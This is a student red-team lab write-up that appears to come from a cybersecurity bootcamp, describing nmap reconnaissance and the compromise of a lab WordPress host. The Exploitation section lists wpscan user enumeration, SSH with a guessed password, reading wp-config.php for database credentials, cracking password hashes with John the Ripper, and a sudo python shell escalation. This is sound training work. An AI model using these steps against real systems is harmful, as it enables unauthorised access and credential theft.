# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap 192.168.1.110 -sV
  # Nmap 7.80 scan initiated Mon Jun 13 14:44:13 2022 as: nmap -sV -oN sV_scan.txt 192.168.1.110
  Nmap scan report for 192.168.1.110
  Host is up (0.0011s latency).
  Not shown: 995 closed ports
  PORT    STATE SERVICE     VERSION
  22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
  80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
  111/tcp open  rpcbind     2-4 (RPC #100000)
  139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  MAC Address: 00:15:5D:00:04:10 (Microsoft)
  Service Info: Host: TARGET1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This scan identifies the services below as potential points of entry:
- Target 1
  - Port 22: OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
  - port 80: Apache httpd 2.4.10 ((Debian))
  - port 111: 2-4 (RPC #100000)
  - port 139: Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  - port 445: Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

The following vulnerabilities were identified on each target:
- Target 1
  - CVE-2021-44228 Log4j Severity: 10.0 https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  - CVE-2022-23943 Severity: 9.8 https://vulners.com/cve/CVE-2022-23943
  - CVE-2022-22720	Severity: 9.8	https://vulners.com/cve/CVE-2022-22720
  - CVE-2021-44790	Severity: 9.8	https://vulners.com/cve/CVE-2021-44790
  - CVE-2021-39275	Severity: 9.8	https://vulners.com/cve/CVE-2021-39275
  - CVE-2021-26691	Severity: 9.8	https://vulners.com/cve/CVE-2021-26691
  - CVE-2017-7679	Severity: 9.8	https://vulners.com/cve/CVE-2017-7679
  - CVE-2017-3169	Severity: 9.8	https://vulners.com/cve/CVE-2017-3169
  - CVE-2017-3167	Severity: 9.8	https://vulners.com/cve/CVE-2017-3167

[nmap vuln scan](https://github.com/Jerec-Huddleston/Bootcamp-Homework/blob/main/24-Final-Project/Red/vuln_scan.txt)

[nmap vulners scan](https://github.com/Jerec-Huddleston/Bootcamp-Homework/blob/main/24-Final-Project/Red/vulners_scan.txt)

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1`: b9bbcb33e11b80be759c4e844862482d
    - **Exploit Used**
      - wordpress user enumeration
        - `wpscan –-url http://192.168.1.110/wordpress --enumerate u`
          ![wpscan](https://github.com/Jerec-Huddleston/Bootcamp-Homework/blob/main/24-Final-Project/Red/img/wpscan.PNG)
      - ssh connection with password guessing
        - `ssh michael@192.168.1.110`
        - password: `michael`

      ![flag 1](https://github.com/Jerec-Huddleston/Bootcamp-Homework/blob/main/24-Final-Project/Red/img/flag%201.PNG)
  - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
    - **Exploit Used**
      - same as flag 1
        
      ![flag 2](https://github.com/Jerec-Huddleston/Bootcamp-Homework/blob/main/24-Final-Project/Red/img/flag%202.PNG)
  - `flag3`: afc01ab56b50591e7dccf93122770cd2
    - **Exploit Used**
      - login info from database config file
         - `less /var/www/html/wordpress/wp-config.php`

      ![flag 3](https://github.com/Jerec-Huddleston/Bootcamp-Homework/blob/main/24-Final-Project/Red/img/flag%203.PNG)
  - `flag4`: 715dea6c055b9fe3337544932f2941ce
    - **Exploit Used**
      - password hashes from wp_users
        ![wp_users](https://github.com/Jerec-Huddleston/Bootcamp-Homework/blob/main/24-Final-Project/Red/img/wp_users.PNG)
      - john the ripper to crack password hashes
        ![john](https://github.com/Jerec-Huddleston/Bootcamp-Homework/blob/main/24-Final-Project/Red/img/john%20the%20ripper.PNG)
      - ssh with cracked password
        - `ssh steven@192.168.1.110`
      - python privilege escalation
        - `sudo python -c 'import pty;pty.spawn("/bin/bash");'`

      ![flag 4](https://github.com/Jerec-Huddleston/Bootcamp-Homework/blob/main/24-Final-Project/Red/img/flag4.PNG)
